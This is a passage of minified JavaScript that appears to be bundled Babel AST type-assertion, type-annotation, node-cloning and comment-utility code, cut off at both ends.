rtPlaceholder=lG1;t3.assertPrivate=Xz1;t3.assertPrivateName=qW1;t3.assertProgram=qY1;t3.assertProperty=i$1;t3.assertPureish=x$1;t3.assertQualifiedTypeIdentifier=XG1;t3.assertRecordExpression=oG1;t3.assertRegExpLiteral=UY1;t3.assertRegexLiteral=Mz1;t3.assertRestElement=FY1;t3.assertRestProperty=jz1;t3.assertReturnStatement=OY1;t3.assertScopable=L$1;t3.assertSequenceExpression=AY1;t3.assertSpreadElement=sY1;t3.assertSpreadProperty=Fz1;t3.assertStandardized=O$1;t3.assertStatement=w$1;t3.assertStaticBlock=ZW1;t3.assertStringLiteral=GY1;t3.assertStringLiteralTypeAnnotation=QG1;t3.assertStringTypeAnnotation=JG1;t3.assertSuper=tY1;t3.assertSwitchCase=LY1;t3.assertSwitchStatement=DY1;t3.assertSymbolTypeAnnotation=YG1;t3.assertTSAnyKeyword=ZH1;t3.assertTSArrayType=vH1;t3.assertTSAsExpression=X$1;t3.assertTSBaseType=qz1;t3.assertTSBigIntKeyword=jH1;t3.assertTSBooleanKeyword=MH1;t3.assertTSCallSignatureDeclaration=UH1;t3.assertTSConditionalType=uH1;t3.assertTSConstructSignatureDeclaration=KH1;t3.assertTSConstructorType=EH1;t3.assertTSDeclareFunction=HH1;t3.assertTSDeclareMethod=$H1;t3.assertTSEntityName=m$1;t3.assertTSEnumBody=Y$1;t3.assertTSEnumDeclaration=W$1;t3.assertTSEnumMember=G$1;t3.assertTSExportAssignment=B$1;t3.assertTSExpressionWithTypeArguments=aH1;t3.assertTSExternalModuleReference=K$1;t3.assertTSFunctionType=SH1;t3.assertTSImportEqualsDeclaration=U$1;t3.assertTSImportType=z$1;t3.assertTSIndexSignature=qH1;t3.assertTSIndexedAccessType=dH1;t3.assertTSInferType=cH1;t3.assertTSInstantiationExpression=eH1;t3.assertTSInterfaceBody=sH1;t3.assertTSInterfaceDeclaration=oH1;t3.assertTSIntersectionType=mH1;t3.assertTSIntrinsicKeyword=FH1;t3.assertTSLiteralType=nH1;t3.assertTSMappedType=iH1;t3.assertTSMethodSignature=BH1;t3.assertTSModuleBlock=$$1;t3.assertTSModuleDeclaration=H$1;t3.assertTSNamedTupleMember=yH1;t3.assertTSNamespaceExportDeclaration=q$1;t3.assertTSNeverKeyword=OH1;t3.assertTSNonNullExpression=V$1;t3.assertTSNullKeyword=AH1;t3.assertTSNumberKeyword=RH1;t3.assertTSObjectKeyword=LH1;t3.assertTSOptionalType=fH1;t3.assertTSParameterProperty=GH1;t3.assertTSParenthesizedType=lH1;t3.assertTSPropertySignature=VH1;t3.assertTSQualifiedName=zH1;t3.assertTSRestType=hH1;t3.assertTSSatisfiesExpression=Q$1;t3.assertTSStringKeyword=DH1;t3.assertTSSymbolKeyword=NH1;t3.assertTSTemplateLiteralType=rH1;t3.assertTSThisType=PH1;t3.assertTSTupleType=xH1;t3.assertTSType=Bz1;t3.assertTSTypeAliasDeclaration=tH1;t3.assertTSTypeAnnotation=Z$1;t3.assertTSTypeAssertion=J$1;t3.assertTSTypeElement=Vz1;t3.assertTSTypeLiteral=bH1;t3.assertTSTypeOperator=pH1;t3.assertTSTypeParameter=F$1;t3.assertTSTypeParameterDeclaration=j$1;t3.assertTSTypeParameterInstantiation=M$1;t3.assertTSTypePredicate=_H1;t3.assertTSTypeQuery=kH1;t3.assertTSTypeReference=TH1;t3.assertTSUndefinedKeyword=wH1;t3.assertTSUnionType=gH1;t3.assertTSUnknownKeyword=IH1;t3.assertTSVoidKeyword=CH1;t3.assertTaggedTemplateExpression=eY1;t3.assertTemplateElement=XW1;t3.assertTemplateLiteral=QW1;t3.assertTerminatorless=I$1;t3.assertThisExpression=NY1;t3.assertThisTypeAnnotation=WG1;t3.assertThrowStatement=wY1;t3.assertTopicReference=XH1;t3.assertTryStatement=IY1;t3.assertTupleExpression=sG1;t3.assertTupleTypeAnnotation=GG1;t3.assertTypeAlias=$G1;t3.assertTypeAnnotation=zG1;t3.assertTypeCastExpression=UG1;t3.assertTypeParameter=KG1;t3.assertTypeParameterDeclaration=VG1;t3.assertTypeParameterInstantiation=BG1;t3.assertTypeScript=Kz1;t3.assertTypeofTypeAnnotation=HG1;t3.assertUnaryExpression=CY1;t3.assertUnaryLike=r$1;t3.assertUnionTypeAnnotation=qG1;t3.assertUpdateExpression=PY1;t3.assertUserWhitespacable=l$1;t3.assertV8IntrinsicIdentifier=pG1;t3.assertVariableDeclaration=SY1;t3.assertVariableDeclarator=EY1;t3.assertVariance=ZG1;t3.assertVoidPattern=WH1;t3.assertVoidTypeAnnotation=MG1;t3.assertWhile=E$1;t3.assertWhileStatement=TY1;t3.assertWithStatement=_Y1;t3.assertYieldExpression=JW1;var vJ1=H5(),c4=G5();function P(X,Q,J){if(!(0,vJ1.default)(X,Q,J))throw Error(`Expected type "${X}" with option ${JSON.stringify(J)}, but instead got "${Q.type}".`)}function xJ1(X,Q){P("ArrayExpression",X,Q)}function fJ1(X,Q){P("AssignmentExpression",X,Q)}function hJ1(X,Q){P("BinaryExpression",X,Q)}function yJ1(X,Q){P("InterpreterDirective",X,Q)}function gJ1(X,Q){P("Directive",X,Q)}function mJ1(X,Q){P("DirectiveLiteral",X,Q)}function uJ1(X,Q){P("BlockStatement",X,Q)}function cJ1(X,Q){P("BreakStatement",X,Q)}function lJ1(X,Q){P("CallExpression",X,Q)}function pJ1(X,Q){P("CatchClause",X,Q)}function dJ1(X,Q){P("ConditionalExpression",X,Q)}function iJ1(X,Q){P("ContinueStatement",X,Q)}function rJ1(X,Q){P("DebuggerStatement",X,Q)}function nJ1(X,Q){P("DoWhileStatement",X,Q)}function aJ1(X,Q){P("EmptyStatement",X,Q)}function oJ1(X,Q){P("ExpressionStatement",X,Q)}function sJ1(X,Q){P("File",X,Q)}function tJ1(X,Q){P("ForInStatement",X,Q)}function eJ1(X,Q){P("ForStatement",X,Q)}function XY1(X,Q){P("FunctionDeclaration",X,Q)}function QY1(X,Q){P("FunctionExpression",X,Q)}function JY1(X,Q){P("Identifier",X,Q)}function YY1(X,Q){P("IfStatement",X,Q)}function WY1(X,Q){P("LabeledStatement",X,Q)}function GY1(X,Q){P("StringLiteral",X,Q)}function HY1(X,Q){P("NumericLiteral",X,Q)}function $Y1(X,Q){P("NullLiteral",X,Q)}function zY1(X,Q){P("BooleanLiteral",X,Q)}function UY1(X,Q){P("RegExpLiteral",X,Q)}function KY1(X,Q){P("LogicalExpression",X,Q)}function VY1(X,Q){P("MemberExpression",X,Q)}function BY1(X,Q){P("NewExpression",X,Q)}function qY1(X,Q){P("Program",X,Q)}function ZY1(X,Q){P("ObjectExpression",X,Q)}function MY1(X,Q){P("ObjectMethod",X,Q)}function jY1(X,Q){P("ObjectProperty",X,Q)}function FY1(X,Q){P("RestElement",X,Q)}function OY1(X,Q){P("ReturnStatement",X,Q)}function AY1(X,Q){P("SequenceExpression",X,Q)}function RY1(X,Q){P("ParenthesizedExpression",X,Q)}function LY1(X,Q){P("SwitchCase",X,Q)}function DY1(X,Q){P("SwitchStatement",X,Q)}function NY1(X,Q){P("ThisExpression",X,Q)}function wY1(X,Q){P("ThrowStatement",X,Q)}function IY1(X,Q){P("TryStatement",X,Q)}function CY1(X,Q){P("UnaryExpression",X,Q)}function PY1(X,Q){P("UpdateExpression",X,Q)}function SY1(X,Q){P("VariableDeclaration",X,Q)}function EY1(X,Q){P("VariableDeclarator",X,Q)}function TY1(X,Q){P("WhileStatement",X,Q)}function _Y1(X,Q){P("WithStatement",X,Q)}function kY1(X,Q){P("AssignmentPattern",X,Q)}function bY1(X,Q){P("ArrayPattern",X,Q)}function vY1(X,Q){P("ArrowFunctionExpression",X,Q)}function xY1(X,Q){P("ClassBody",X,Q)}function fY1(X,Q){P("ClassExpression",X,Q)}function hY1(X,Q){P("ClassDeclaration",X,Q)}function yY1(X,Q){P("ExportAllDeclaration",X,Q)}function gY1(X,Q){P("ExportDefaultDeclaration",X,Q)}function mY1(X,Q){P("ExportNamedDeclaration",X,Q)}function uY1(X,Q){P("ExportSpecifier",X,Q)}function cY1(X,Q){P("ForOfStatement",X,Q)}function lY1(X,Q){P("ImportDeclaration",X,Q)}function pY1(X,Q){P("ImportDefaultSpecifier",X,Q)}function dY1(X,Q){P("ImportNamespaceSpecifier",X,Q)}function iY1(X,Q){P("ImportSpecifier",X,Q)}function rY1(X,Q){P("ImportExpression",X,Q)}function nY1(X,Q){P("MetaProperty",X,Q)}function aY1(X,Q){P("ClassMethod",X,Q)}function oY1(X,Q){P("ObjectPattern",X,Q)}function sY1(X,Q){P("SpreadElement",X,Q)}function tY1(X,Q){P("Super",X,Q)}function eY1(X,Q){P("TaggedTemplateExpression",X,Q)}function XW1(X,Q){P("TemplateElement",X,Q)}function QW1(X,Q){P("TemplateLiteral",X,Q)}function JW1(X,Q){P("YieldExpression",X,Q)}function YW1(X,Q){P("AwaitExpression",X,Q)}function WW1(X,Q){P("Import",X,Q)}function GW1(X,Q){P("BigIntLiteral",X,Q)}function HW1(X,Q){P("ExportNamespaceSpecifier",X,Q)}function $W1(X,Q){P("OptionalMemberExpression",X,Q)}function zW1(X,Q){P("OptionalCallExpression",X,Q)}function UW1(X,Q){P("ClassProperty",X,Q)}function KW1(X,Q){P("ClassAccessorProperty",X,Q)}function VW1(X,Q){P("ClassPrivateProperty",X,Q)}function BW1(X,Q){P("ClassPrivateMethod",X,Q)}function qW1(X,Q){P("PrivateName",X,Q)}function ZW1(X,Q){P("StaticBlock",X,Q)}function MW1(X,Q){P("ImportAttribute",X,Q)}function jW1(X,Q){P("AnyTypeAnnotation",X,Q)}function FW1(X,Q){P("ArrayTypeAnnotation",X,Q)}function OW1(X,Q){P("BooleanTypeAnnotation",X,Q)}function AW1(X,Q){P("BooleanLiteralTypeAnnotation",X,Q)}function RW1(X,Q){P("NullLiteralTypeAnnotation",X,Q)}function LW1(X,Q){P("ClassImplements",X,Q)}function DW1(X,Q){P("DeclareClass",X,Q)}function NW1(X,Q){P("DeclareFunction",X,Q)}function wW1(X,Q){P("DeclareInterface",X,Q)}function IW1(X,Q){P("DeclareModule",X,Q)}function CW1(X,Q){P("DeclareModuleExports",X,Q)}function PW1(X,Q){P("DeclareTypeAlias",X,Q)}function SW1(X,Q){P("DeclareOpaqueType",X,Q)}function EW1(X,Q){P("DeclareVariable",X,Q)}function TW1(X,Q){P("DeclareExportDeclaration",X,Q)}function _W1(X,Q){P("DeclareExportAllDeclaration",X,Q)}function kW1(X,Q){P("DeclaredPredicate",X,Q)}function bW1(X,Q){P("ExistsTypeAnnotation",X,Q)}function vW1(X,Q){P("FunctionTypeAnnotation",X,Q)}function xW1(X,Q){P("FunctionTypeParam",X,Q)}function fW1(X,Q){P("GenericTypeAnnotation",X,Q)}function hW1(X,Q){P("InferredPredicate",X,Q)}function yW1(X,Q){P("InterfaceExtends",X,Q)}function gW1(X,Q){P("InterfaceDeclaration",X,Q)}function mW1(X,Q){P("InterfaceTypeAnnotation",X,Q)}function uW1(X,Q){P("IntersectionTypeAnnotation",X,Q)}function cW1(X,Q){P("MixedTypeAnnotation",X,Q)}function lW1(X,Q){P("EmptyTypeAnnotation",X,Q)}function pW1(X,Q){P("NullableTypeAnnotation",X,Q)}function dW1(X,Q){P("NumberLiteralTypeAnnotation",X,Q)}function iW1(X,Q){P("NumberTypeAnnotation",X,Q)}function rW1(X,Q){P("ObjectTypeAnnotation",X,Q)}function nW1(X,Q){P("ObjectTypeInternalSlot",X,Q)}function aW1(X,Q){P("ObjectTypeCallProperty",X,Q)}function oW1(X,Q){P("ObjectTypeIndexer",X,Q)}function sW1(X,Q){P("ObjectTypeProperty",X,Q)}function tW1(X,Q){P("ObjectTypeSpreadProperty",X,Q)}function eW1(X,Q){P("OpaqueType",X,Q)}function XG1(X,Q){P("QualifiedTypeIdentifier",X,Q)}function QG1(X,Q){P("StringLiteralTypeAnnotation",X,Q)}function JG1(X,Q){P("StringTypeAnnotation",X,Q)}function YG1(X,Q){P("SymbolTypeAnnotation",X,Q)}function WG1(X,Q){P("ThisTypeAnnotation",X,Q)}function GG1(X,Q){P("TupleTypeAnnotation",X,Q)}function HG1(X,Q){P("TypeofTypeAnnotation",X,Q)}function $G1(X,Q){P("TypeAlias",X,Q)}function zG1(X,Q){P("TypeAnnotation",X,Q)}function UG1(X,Q){P("TypeCastExpression",X,Q)}function KG1(X,Q){P("TypeParameter",X,Q)}function VG1(X,Q){P("TypeParameterDeclaration",X,Q)}function BG1(X,Q){P("TypeParameterInstantiation",X,Q)}function qG1(X,Q){P("UnionTypeAnnotation",X,Q)}function ZG1(X,Q){P("Variance",X,Q)}function MG1(X,Q){P("VoidTypeAnnotation",X,Q)}function jG1(X,Q){P("EnumDeclaration",X,Q)}function FG1(X,Q){P("EnumBooleanBody",X,Q)}function OG1(X,Q){P("EnumNumberBody",X,Q)}function AG1(X,Q){P("EnumStringBody",X,Q)}function RG1(X,Q){P("EnumSymbolBody",X,Q)}function LG1(X,Q){P("EnumBooleanMember",X,Q)}function DG1(X,Q){P("EnumNumberMember",X,Q)}function NG1(X,Q){P("EnumStringMember",X,Q)}function wG1(X,Q){P("EnumDefaultedMember",X,Q)}function IG1(X,Q){P("IndexedAccessType",X,Q)}function CG1(X,Q){P("OptionalIndexedAccessType",X,Q)}function PG1(X,Q){P("JSXAttribute",X,Q)}function SG1(X,Q){P("JSXClosingElement",X,Q)}function EG1(X,Q){P("JSXElement",X,Q)}function TG1(X,Q){P("JSXEmptyExpression",X,Q)}function _G1(X,Q){P("JSXExpressionContainer",X,Q)}function kG1(X,Q){P("JSXSpreadChild",X,Q)}function bG1(X,Q){P("JSXIdentifier",X,Q)}function vG1(X,Q){P("JSXMemberExpression",X,Q)}function xG1(X,Q){P("JSXNamespacedName",X,Q)}function fG1(X,Q){P("JSXOpeningElement",X,Q)}function hG1(X,Q){P("JSXSpreadAttribute",X,Q)}function yG1(X,Q){P("JSXText",X,Q)}function gG1(X,Q){P("JSXFragment",X,Q)}function mG1(X,Q){P("JSXOpeningFragment",X,Q)}function uG1(X,Q){P("JSXClosingFragment",X,Q)}function cG1(X,Q){P("Noop",X,Q)}function lG1(X,Q){P("Placeholder",X,Q)}function pG1(X,Q){P("V8IntrinsicIdentifier",X,Q)}function dG1(X,Q){P("ArgumentPlaceholder",X,Q)}function iG1(X,Q){P("BindExpression",X,Q)}function rG1(X,Q){P("Decorator",X,Q)}function nG1(X,Q){P("DoExpression",X,Q)}function aG1(X,Q){P("ExportDefaultSpecifier",X,Q)}function oG1(X,Q){P("RecordExpression",X,Q)}function sG1(X,Q){P("TupleExpression",X,Q)}function tG1(X,Q){P("DecimalLiteral",X,Q)}function eG1(X,Q){P("ModuleExpression",X,Q)}function XH1(X,Q){P("TopicReference",X,Q)}function QH1(X,Q){P("PipelineTopicExpression",X,Q)}function JH1(X,Q){P("PipelineBareFunction",X,Q)}function YH1(X,Q){P("PipelinePrimaryTopicReference",X,Q)}function WH1(X,Q){P("VoidPattern",X,Q)}function GH1(X,Q){P("TSParameterProperty",X,Q)}function HH1(X,Q){P("TSDeclareFunction",X,Q)}function $H1(X,Q){P("TSDeclareMethod",X,Q)}function zH1(X,Q){P("TSQualifiedName",X,Q)}function UH1(X,Q){P("TSCallSignatureDeclaration",X,Q)}function KH1(X,Q){P("TSConstructSignatureDeclaration",X,Q)}function VH1(X,Q){P("TSPropertySignature",X,Q)}function BH1(X,Q){P("TSMethodSignature",X,Q)}function qH1(X,Q){P("TSIndexSignature",X,Q)}function ZH1(X,Q){P("TSAnyKeyword",X,Q)}function MH1(X,Q){P("TSBooleanKeyword",X,Q)}function jH1(X,Q){P("TSBigIntKeyword",X,Q)}function FH1(X,Q){P("TSIntrinsicKeyword",X,Q)}function OH1(X,Q){P("TSNeverKeyword",X,Q)}function AH1(X,Q){P("TSNullKeyword",X,Q)}function RH1(X,Q){P("TSNumberKeyword",X,Q)}function LH1(X,Q){P("TSObjectKeyword",X,Q)}function DH1(X,Q){P("TSStringKeyword",X,Q)}function NH1(X,Q){P("TSSymbolKeyword",X,Q)}function wH1(X,Q){P("TSUndefinedKeyword",X,Q)}function IH1(X,Q){P("TSUnknownKeyword",X,Q)}function CH1(X,Q){P("TSVoidKeyword",X,Q)}function PH1(X,Q){P("TSThisType",X,Q)}function SH1(X,Q){P("TSFunctionType",X,Q)}function EH1(X,Q){P("TSConstructorType",X,Q)}function TH1(X,Q){P("TSTypeReference",X,Q)}function _H1(X,Q){P("TSTypePredicate",X,Q)}function kH1(X,Q){P("TSTypeQuery",X,Q)}function bH1(X,Q){P("TSTypeLiteral",X,Q)}function vH1(X,Q){P("TSArrayType",X,Q)}function xH1(X,Q){P("TSTupleType",X,Q)}function fH1(X,Q){P("TSOptionalType",X,Q)}function hH1(X,Q){P("TSRestType",X,Q)}function yH1(X,Q){P("TSNamedTupleMember",X,Q)}function gH1(X,Q){P("TSUnionType",X,Q)}function mH1(X,Q){P("TSIntersectionType",X,Q)}function uH1(X,Q){P("TSConditionalType",X,Q)}function cH1(X,Q){P("TSInferType",X,Q)}function lH1(X,Q){P("TSParenthesizedType",X,Q)}function pH1(X,Q){P("TSTypeOperator",X,Q)}function dH1(X,Q){P("TSIndexedAccessType",X,Q)}function iH1(X,Q){P("TSMappedType",X,Q)}function rH1(X,Q){P("TSTemplateLiteralType",X,Q)}function nH1(X,Q){P("TSLiteralType",X,Q)}function aH1(X,Q){P("TSExpressionWithTypeArguments",X,Q)}function oH1(X,Q){P("TSInterfaceDeclaration",X,Q)}function sH1(X,Q){P("TSInterfaceBody",X,Q)}function tH1(X,Q){P("TSTypeAliasDeclaration",X,Q)}function eH1(X,Q){P("TSInstantiationExpression",X,Q)}function X$1(X,Q){P("TSAsExpression",X,Q)}function Q$1(X,Q){P("TSSatisfiesExpression",X,Q)}function J$1(X,Q){P("TSTypeAssertion",X,Q)}function Y$1(X,Q){P("TSEnumBody",X,Q)}function W$1(X,Q){P("TSEnumDeclaration",X,Q)}function G$1(X,Q){P("TSEnumMember",X,Q)}function H$1(X,Q){P("TSModuleDeclaration",X,Q)}function $$1(X,Q){P("TSModuleBlock",X,Q)}function z$1(X,Q){P("TSImportType",X,Q)}function U$1(X,Q){P("TSImportEqualsDeclaration",X,Q)}function K$1(X,Q){P("TSExternalModuleReference",X,Q)}function V$1(X,Q){P("TSNonNullExpression",X,Q)}function B$1(X,Q){P("TSExportAssignment",X,Q)}function q$1(X,Q){P("TSNamespaceExportDeclaration",X,Q)}function Z$1(X,Q){P("TSTypeAnnotation",X,Q)}function M$1(X,Q){P("TSTypeParameterInstantiation",X,Q)}function j$1(X,Q){P("TSTypeParameterDeclaration",X,Q)}function F$1(X,Q){P("TSTypeParameter",X,Q)}function O$1(X,Q){P("Standardized",X,Q)}function A$1(X,Q){P("Expression",X,Q)}function R$1(X,Q){P("Binary",X,Q)}function L$1(X,Q){P("Scopable",X,Q)}function D$1(X,Q){P("BlockParent",X,Q)}function N$1(X,Q){P("Block",X,Q)}function w$1(X,Q){P("Statement",X,Q)}function I$1(X,Q){P("Terminatorless",X,Q)}function C$1(X,Q){P("CompletionStatement",X,Q)}function P$1(X,Q){P("Conditional",X,Q)}function S$1(X,Q){P("Loop",X,Q)}function E$1(X,Q){P("While",X,Q)}function T$1(X,Q){P("ExpressionWrapper",X,Q)}function _$1(X,Q){P("For",X,Q)}function k$1(X,Q){P("ForXStatement",X,Q)}function b$1(X,Q){P("Function",X,Q)}function v$1(X,Q){P("FunctionParent",X,Q)}function x$1(X,Q){P("Pureish",X,Q)}function f$1(X,Q){P("Declaration",X,Q)}function h$1(X,Q){P("FunctionParameter",X,Q)}function y$1(X,Q){P("PatternLike",X,Q)}function g$1(X,Q){P("LVal",X,Q)}function m$1(X,Q){P("TSEntityName",X,Q)}function u$1(X,Q){P("Literal",X,Q)}function c$1(X,Q){P("Immutable",X,Q)}function l$1(X,Q){P("UserWhitespacable",X,Q)}function p$1(X,Q){P("Method",X,Q)}function d$1(X,Q){P("ObjectMember",X,Q)}function i$1(X,Q){P("Property",X,Q)}function r$1(X,Q){P("UnaryLike",X,Q)}function n$1(X,Q){P("Pattern",X,Q)}function a$1(X,Q){P("Class",X,Q)}function o$1(X,Q){P("ImportOrExportDeclaration",X,Q)}function s$1(X,Q){P("ExportDeclaration",X,Q)}function t$1(X,Q){P("ModuleSpecifier",X,Q)}function e$1(X,Q){P("Accessor",X,Q)}function Xz1(X,Q){P("Private",X,Q)}function Qz1(X,Q){P("Flow",X,Q)}function Jz1(X,Q){P("FlowType",X,Q)}function Yz1(X,Q){P("FlowBaseAnnotation",X,Q)}function Wz1(X,Q){P("FlowDeclaration",X,Q)}function Gz1(X,Q){P("FlowPredicate",X,Q)}function Hz1(X,Q){P("EnumBody",X,Q)}function $z1(X,Q){P("EnumMember",X,Q)}function zz1(X,Q){P("JSX",X,Q)}function Uz1(X,Q){P("Miscellaneous",X,Q)}function Kz1(X,Q){P("TypeScript",X,Q)}function Vz1(X,Q){P("TSTypeElement",X,Q)}function Bz1(X,Q){P("TSType",X,Q)}function qz1(X,Q){P("TSBaseType",X,Q)}function Zz1(X,Q){(0,c4.default)("assertNumberLiteral","assertNumericLiteral"),P("NumberLiteral",X,Q)}function Mz1(X,Q){(0,c4.default)("assertRegexLiteral","assertRegExpLiteral"),P("RegexLiteral",X,Q)}function jz1(X,Q){(0,c4.default)("assertRestProperty","assertRestElement"),P("RestProperty",X,Q)}function Fz1(X,Q){(0,c4.default)("assertSpreadProperty","assertSpreadElement"),P("SpreadProperty",X,Q)}function Oz1(X,Q){(0,c4.default)("assertModuleDeclaration","assertImportOrExportDeclaration"),P("ModuleDeclaration",X,Q)}});var JM=m((XM)=>{Object.defineProperty(XM,"__esModule",{value:!0});XM.default=void 0;var P6=c9(),RJ0=XM.default=Yq1;function Yq1(X){switch(X){case"string":return(0,P6.stringTypeAnnotation)();case"number":return(0,P6.numberTypeAnnotation)();case"undefined":return(0,P6.voidTypeAnnotation)();case"boolean":return(0,P6.booleanTypeAnnotation)();case"function":return(0,P6.genericTypeAnnotation)((0,P6.identifier)("Function"));case"object":return(0,P6.genericTypeAnnotation)((0,P6.identifier)("Object"));case"symbol":return(0,P6.genericTypeAnnotation)((0,P6.identifier)("Symbol"));case"bigint":return(0,P6.anyTypeAnnotation)()}throw Error("Invalid typeof value: "+X)}});var Z$=m((GM)=>{Object.defineProperty(GM,"__esModule",{value:!0});GM.default=WM;var l4=d0();function YM(X){return(0,l4.isIdentifier)(X)?X.name:`${X.id.name}.${YM(X.qualification)}`}function WM(X){let Q=Array.from(X),J=new Map,Y=new Map,W=new Set,G=[];for(let H=0;H<Q.length;H++){let $=Q[H];if(!$)continue;if(G.includes($))continue;if((0,l4.isAnyTypeAnnotation)($))return[$];if((0,l4.isFlowBaseAnnotation)($)){Y.set($.type,$);continue}if((0,l4.isUnionTypeAnnotation)($)){if(!W.has($.types))Q.push(...$.types),W.add($.types);continue}if((0,l4.isGenericTypeAnnotation)($)){let z=YM($.id);if(J.has(z)){let U=J.get(z);if(U.typeParameters){if($.typeParameters)U.typeParameters.params.push(...$.typeParameters.params),U.typeParameters.params=WM(U.typeParameters.params)}else U=$.typeParameters}else J.set(z,$);continue}G.push($)}for(let[,H]of Y)G.push(H);for(let[,H]of J)G.push(H);return G}});var $M=m((HM)=>{Object.defineProperty(HM,"__esModule",{value:!0});HM.default=$q1;var Gq1=c9(),Hq1=Z$();function $q1(X){let Q=(0,Hq1.default)(X);if(Q.length===1)return Q[0];else return(0,Gq1.unionTypeAnnotation)(Q)}});var VM=m((KM)=>{Object.defineProperty(KM,"__esModule",{value:!0});KM.default=UM;var B5=d0();function zM(X){return(0,B5.isIdentifier)(X)?X.name:(0,B5.isThisExpression)(X)?"this":`${X.right.name}.${zM(X.left)}`}function UM(X){let Q=Array.from(X),J=new Map,Y=new Map,W=new Set,G=[];for(let H=0;H<Q.length;H++){let $=Q[H];if(!$)continue;if(G.includes($))continue;if((0,B5.isTSAnyKeyword)($))return[$];if((0,B5.isTSBaseType)($)){Y.set($.type,$);continue}if((0,B5.isTSUnionType)($)){if(!W.has($.types))Q.push(...$.types),W.add($.types);continue}let z="typeParameters";if((0,B5.isTSTypeReference)($)&&$[z]){let U=$[z],K=zM($.typeName);if(J.has(K)){let B=J.get(K),q=B[z];if(q)q.params.push(...U.params),q.params=UM(q.params);else B=U}else J.set(K,$);continue}G.push($)}for(let[,H]of Y)G.push(H);for(let[,H]of J)G.push(H);return G}});var qM=m((BM)=>{Object.defineProperty(BM,"__esModule",{value:!0});BM.default=qq1;var Kq1=c9(),Vq1=VM(),Bq1=d0();function qq1(X){let Q=X.map((Y)=>{return(0,Bq1.isTSTypeAnnotation)(Y)?Y.typeAnnotation:Y}),J=(0,Vq1.default)(Q);if(J.length===1)return J[0];else return(0,Kq1.tsUnionType)(J)}});var M$=m((MM)=>{Object.defineProperty(MM,"__esModule",{value:!0});MM.buildUndefinedNode=Mq1;var ZM=c9();function Mq1(){return(0,ZM.unaryExpression)("void",(0,ZM.numericLiteral)(0),!0)}});var ZX=m((RM)=>{Object.defineProperty(RM,"__esModule",{value:!0});RM.default=Fq1;var jM=G6(),FM=d0(),{hasOwn:s6}={hasOwn:Function.call.bind(Object.prototype.hasOwnProperty)};function OM(X,Q,J,Y){if(X&&typeof X.type==="string")return AM(X,Q,J,Y);return X}function j$(X,Q,J,Y){if(Array.isArray(X))return X.map((W)=>OM(W,Q,J,Y));return OM(X,Q,J,Y)}function Fq1(X,Q=!0,J=!1){return AM(X,Q,J,new Map)}function AM(X,Q=!0,J=!1,Y){if(!X)return X;let{type:W}=X,G={type:X.type};if((0,FM.isIdentifier)(X)){if(G.name=X.name,s6(X,"optional")&&typeof X.optional==="boolean")G.optional=X.optional;if(s6(X,"typeAnnotation"))G.typeAnnotation=Q?j$(X.typeAnnotation,!0,J,Y):X.typeAnnotation;if(s6(X,"decorators"))G.decorators=Q?j$(X.decorators,!0,J,Y):X.decorators}else if(!s6(jM.NODE_FIELDS,W))throw Error(`Unknown node type: "${W}"`);else for(let H of Object.keys(jM.NODE_FIELDS[W]))if(s6(X,H))if(Q)G[H]=(0,FM.isFile)(X)&&H==="comments"?qY(X.comments,Q,J,Y):j$(X[H],!0,J,Y);else G[H]=X[H];if(s6(X,"loc"))if(J)G.loc=null;else G.loc=X.loc;if(s6(X,"leadingComments"))G.leadingComments=qY(X.leadingComments,Q,J,Y);if(s6(X,"innerComments"))G.innerComments=qY(X.innerComments,Q,J,Y);if(s6(X,"trailingComments"))G.trailingComments=qY(X.trailingComments,Q,J,Y);if(s6(X,"extra"))G.extra=Object.assign({},X.extra);return G}function qY(X,Q,J,Y){if(!X||!Q)return X;return X.map((W)=>{let G=Y.get(W);if(G)return G;let{type:H,value:$,loc:z}=W,U={type:H,value:$,loc:z};if(J)U.loc=null;return Y.set(W,U),U})}});var DM=m((LM)=>{Object.defineProperty(LM,"__esModule",{value:!0});LM.default=Rq1;var Aq1=ZX();function Rq1(X){return(0,Aq1.default)(X,!1)}});var wM=m((NM)=>{Object.defineProperty(NM,"__esModule",{value:!0});NM.default=Nq1;var Dq1=ZX();function Nq1(X){return(0,Dq1.default)(X)}});var CM=m((IM)=>{Object.defineProperty(IM,"__esModule",{value:!0});IM.default=Cq1;var Iq1=ZX();function Cq1(X){return(0,Iq1.default)(X,!0,!0)}});var SM=m((PM)=>{Object.defineProperty(PM,"__esModule",{value:!0});PM.default=Eq1;var Sq1=ZX();function Eq1(X){return(0,Sq1.default)(X,!1,!0)}});var F$=m((EM)=>{Object.defineProperty(EM,"__esModule",{value:!0});EM.default=_q1;function _q1(X,Q,J){if(!J||!X)return X;let Y=`${Q}Comments`;if(X[Y])if(Q==="leading")X[Y]=J.concat(X[Y]);else X[Y].push(...J);else X[Y]=J;return X}});var _M=m((TM)=>{Object.defineProperty(TM,"__esModule",{value:!0});TM.default=vq1;var bq1=F$();function vq1(X,Q,J,Y){return(0,bq1.default)(X,Q,[{type:Y?"CommentLine":"CommentBlock",value:J}])}});var ZY=m((kM)=>{Object.defineProperty(kM,"__esModule",{value:!0});kM.default=fq1;function fq1(X,Q,J){if(Q&&J)Q[X]=Array.from(new Set([].concat(Q[X],J[X]).filter(Boolean)))}});var O$=m((bM)=>{Object.defineProperty(bM,"__esModule",{value:!0});bM.default=gq1;var yq1=ZY();function gq1(X,Q){(0,yq1.default)("innerComments",X,Q)}});var A$=m((vM)=>{Object.defineProperty(vM,"__esModule",{value:!0});vM.default=cq1;var uq1=ZY();function cq1(X,Q){(0,uq1.default)("leadingComments",X,Q)}});var R$=m((xM)=>{Object.defineProperty(xM,"__esModule",{value:!0});xM.default=dq1;var pq1=ZY();function dq1(X,Q){(0,pq1.default)("trailingComments",X,Q)}});var L$=m((fM)=>{Object.defineProperty(fM,"__esModule",{value:!0});fM.default=oq1;var rq1=R$(),nq1=A$(),aq1=O$();function oq1(X,Q){return(0,rq1.default)(X,Q),(0,nq1.default)(X,Q),(0,aq1.default)(X,Q),X}});var yM=m((hM)=>{Object.defineProperty(hM,"__esModule",{value:!0});hM.default=eq1;var tq1=z5();function eq1(X){return tq1.COMMENT_KEYS.forEach((Q)=>{X[Q]=null}),X}});var 